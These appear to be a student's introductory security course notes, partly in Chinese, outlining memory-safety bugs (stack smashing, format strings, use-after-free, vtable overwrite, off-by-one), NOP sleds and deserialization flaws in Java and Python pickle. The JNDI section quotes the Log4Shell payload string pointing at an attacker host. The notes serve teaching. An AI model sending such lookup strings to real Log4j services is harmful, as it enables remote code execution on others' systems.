# week 1-3
### x86, callstack

### Memory Safety Vulnerabilities
- Buffer Overflow 缓冲区溢出
  - Stack Smashing 栈溢出
- Integer Memory Safety Vulns 整数溢出
- Format String
  - `%n`
- Heap vulns
  - UAF
  - Overflow vtable 虚表（覆盖下一个对象的虚表）
- Off by one
  - `read(buf_size + 1)`
  - 覆盖 ebp，利用 `mov esp, ebp` 使得第二次 return 的 ebp, esp, eip 在 buf 中（eg. ebp =  buf[0], eip = buf[1]）


+ Serialization
  - 内存安全更多出现在 C 程序
  - Java, Python 会在序列化上遇到类似问题
  - serialize(Java)
    - JNDI with log4j
    - JNDI: A service to fetch data from outside places (e.g. Internet)
  - pickle(python)
    - `__reduce__`


#### vTable
对于存在虚函数的类，为了实现多态，编译器将第一个成员 obj[0] 设置为指向 vTable 的指针
- obj[0] -> `void(* vfTable)[n]()` 指对应类的 vTable
- `vfTable[i]` -> `function` 指向多态函数，可能是 &`jmp main()`

#### Nop Shed
shellcode 前写很多 nop，增加容错

#### JNDI
Suppose Log4j saw the string ${jndi:ldap://attacker.com/pwnage}
- Log4j thinks: “This is a JNDI object I need to include’
- Java thinks: “Okay, let’s get that object from attacker.com”
- Java thinks: “Okay, let’s deserialize that Java object”
